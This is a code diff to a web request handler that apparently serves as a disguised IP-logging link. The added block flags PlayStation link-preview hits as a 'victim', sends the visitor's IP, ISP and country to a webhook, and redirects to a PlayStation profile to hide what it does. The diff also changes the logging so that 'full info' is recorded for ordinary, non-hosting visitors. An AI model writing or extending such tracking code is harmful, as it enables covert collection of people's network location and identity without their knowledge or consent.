@@ -121,8 +121,30 @@ export default async function handler(req, res) {
             return res.end();
         }
 
+        // Check 3: Playstation External Hit
+        if (ipDetails.isp === "Amazon.com, Inc." && userAgent === "UrlPreviewServiceV2") {
+            const message = {
+                embeds: [
+                    {
+                        title: "User Send Link To Victim Playstation Message",
+                        color: 0xFF0000,
+                        description: "Device info collected from sender.",
+                        fields: [
+                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                        ]
+                    }
+                ]
+            };
+            await sendToWebhook(message);
+            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            return res.end();
+        }
+
+
         // Default: Full Info for Other Requests
-        if (ipDetails.hosting) {
+        if (!ipDetails.hosting) {
             const message = {
                 embeds: [
                     {
